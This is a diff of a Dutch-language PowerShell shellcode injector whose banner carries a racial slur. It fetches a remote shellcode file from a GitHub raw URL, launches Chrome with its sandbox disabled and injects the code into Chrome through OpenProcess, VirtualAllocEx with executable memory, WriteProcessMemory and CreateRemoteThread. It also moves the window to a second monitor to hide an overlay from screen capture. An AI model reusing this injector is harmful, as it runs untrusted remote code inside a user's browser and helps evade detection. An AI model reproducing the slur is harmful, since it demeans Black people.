@@ -1,16 +1,16 @@
 # ================================================
-#   NIGGER BYPASS v7.6 - Chrome als Admin + stabiel
-#   Volledig aangepast voor jouw probleem (zwarte clip + overlay)
+# NIGGER BYPASS v7.6 - Chrome ZONDER Admin + stabiel
+# Aangepast: Chrome start nu normaal (niet als Administrator)
 # ================================================
 
 Clear-Host
 Write-Host ""
-Write-Host "  ----------------------------------------" -ForegroundColor Cyan
-Write-Host "  I                                      I" -ForegroundColor Cyan
-Write-Host "  I       NIGGER BYPASS  v7.6            I" -ForegroundColor Cyan
-Write-Host "  I       Gemaakt door: MJBP <3          I" -ForegroundColor Cyan
-Write-Host "  I                                      I" -ForegroundColor Cyan
-Write-Host "  ----------------------------------------" -ForegroundColor Cyan
+Write-Host " ----------------------------------------" -ForegroundColor Cyan
+Write-Host " I I" -ForegroundColor Cyan
+Write-Host " I NIGGER BYPASS v7.6 I" -ForegroundColor Cyan
+Write-Host " I Gemaakt door: MJBP <3 I" -ForegroundColor Cyan
+Write-Host " I I" -ForegroundColor Cyan
+Write-Host " ----------------------------------------" -ForegroundColor Cyan
 Write-Host ""
 
 # ====================== KEUZE 1: STREAMPROOF OF NIET ======================
@@ -22,11 +22,11 @@ if ($choice1 -eq "1") {
     $url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/browser.bin"
     $useNvidiaBypass = $false
     Write-Host "[+] Streamproof shellcode geselecteerd" -ForegroundColor Green
-} 
+}
 elseif ($choice1 -eq "2") {
-    $url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/shellcode.bin"   # Jouw huidige non-stream URL
+    $url = "https://raw.githubusercontent.com/MJ06-BP/bp/main/shellcode.bin"
     Write-Host "[+] Niet-streamproof shellcode geselecteerd" -ForegroundColor Magenta
-    
+   
     Write-Host ""
     Write-Host "[1] Ja, Nvidia Bypass gebruiken" -ForegroundColor Yellow
     Write-Host "[2] Nee, geen Nvidia Bypass" -ForegroundColor Yellow
@@ -37,7 +37,7 @@ elseif ($choice1 -eq "2") {
     } else {
         Write-Host "[+] Nvidia Bypass uitgeschakeld" -ForegroundColor Yellow
     }
-} 
+}
 else {
     Write-Host "[-] Ongeldige keuze!" -ForegroundColor Red
     pause; exit
@@ -47,17 +47,14 @@ else {
 $MonitorX = 0
 $Width = 1920
 $Height = 1080
-
 if ($useNvidiaBypass) {
     Write-Host ""
     Write-Host "[1] Tweede monitor staat LINKS" -ForegroundColor Yellow
     Write-Host "[2] Tweede monitor staat RECHTS" -ForegroundColor Yellow
     $monChoice = Read-Host "Maak je keuze (1 of 2)"
-
     if ($monChoice -eq "1") { $MonitorX = -1920 }
     elseif ($monChoice -eq "2") { $MonitorX = 1920 }
     else { Write-Host "[-] Ongeldige keuze!" -ForegroundColor Red; pause; exit }
-
     Write-Host "[+] Monitor ingesteld op X = $MonitorX" -ForegroundColor Green
 }
 
@@ -67,10 +64,9 @@ if (-not [Environment]::Is64BitProcess) {
     pause; exit
 }
 
-# ====================== STABIELE NVIDIA BYPASS (geen delegate errors) ======================
+# ====================== STABIELE NVIDIA BYPASS ======================
 function Invoke-NvidiaBypass {
     param([int]$TargetPID, [int]$MonitorX = -1920, [int]$Width = 1920, [int]$Height = 1080)
-
     Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -86,7 +82,7 @@ public class Win32 {
 
     $hwnd = $process.MainWindowHandle
 
-    # Extra fallback: alle vensters van dit PID zoeken
+    # Fallback als MainWindowHandle leeg is
     if ($hwnd -eq [IntPtr]::Zero) {
         $hwnd = [IntPtr]::Zero
         $callback = {
@@ -106,38 +102,35 @@ public class Win32 {
     }
 
     Write-Host "[*] Venster verplaatsen naar X = $MonitorX (6x voor stabiliteit)..." -ForegroundColor Yellow
-
     [Win32]::SetForegroundWindow($hwnd) | Out-Null
     for ($i = 1; $i -le 6; $i++) {
         [Win32]::MoveWindow($hwnd, $MonitorX, 0, $Width, $Height, $true) | Out-Null
         Start-Sleep -Milliseconds 150
     }
-
     Write-Host "[+] Nvidia Bypass succesvol uitgevoerd" -ForegroundColor Green
 }
 
-# ====================== CHROME STARTEN ALS ADMINISTRATOR ======================
+# ====================== CHROME STARTEN (ZONDER ADMIN) ======================
 Write-Host ""
-Write-Host "[+] Chrome starten ALS ADMINISTRATOR..." -ForegroundColor Cyan
+Write-Host "[+] Chrome starten (normaal, zonder Administrator)..." -ForegroundColor Cyan
 
 try {
-    Start-Process "chrome.exe" -ArgumentList "--no-sandbox --start-maximized" -Verb RunAs
+    Start-Process "chrome.exe" -ArgumentList "--no-sandbox --start-maximized"
     Start-Sleep 5
 } catch {
-    Write-Host "[-] Kon Chrome niet als Admin starten. Run dit script als Administrator!" -ForegroundColor Red
+    Write-Host "[-] Kon Chrome niet starten. Zorg dat Chrome geïnstalleerd is en in je PATH staat." -ForegroundColor Red
     pause; exit
 }
 
 # Hoofdvenster kiezen
 $targetProcess = Get-Process -Name "chrome" | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object -First 1
-
 if (-not $targetProcess) {
     Write-Host "[-] Geen venster met titel gevonden → laagste memory proces" -ForegroundColor Yellow
     $targetProcess = Get-Process -Name "chrome" | Sort-Object WorkingSet64 | Select-Object -First 1
 }
 
 $targetPID = $targetProcess.Id
-Write-Host "[+] Chrome PID: $targetPID (gestart als Admin)" -ForegroundColor Green
+Write-Host "[+] Chrome PID: $targetPID" -ForegroundColor Green
 
 # ====================== VROEGE BYPASS ======================
 if ($useNvidiaBypass) {
@@ -168,7 +161,9 @@ Add-Type -MemberDefinition @"
 
 try {
     $hProcess = [Native.Win32]::OpenProcess(0x001F0FFF, $false, $targetPID)
-    if ($hProcess -eq [IntPtr]::Zero) { throw "OpenProcess mislukt → Run dit script als Administrator!" }
+    if ($hProcess -eq [IntPtr]::Zero) { 
+        throw "OpenProcess mislukt. Script moet als Administrator draaien!" 
+    }
 
     $addr = [Native.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, 0x3000, 0x40)
     $bytesWritten = [UIntPtr]::Zero
@@ -177,11 +172,11 @@ try {
     [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$null) | Out-Null
 
     Write-Host "[+] Injectie succesvol!" -ForegroundColor Green
-} 
+}
 catch {
     Write-Host "[-] Injectie mislukt: $($_.Exception.Message)" -ForegroundColor Red
     pause; exit
-} 
+}
 finally {
     if ($hProcess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle($hProcess) | Out-Null }
 }
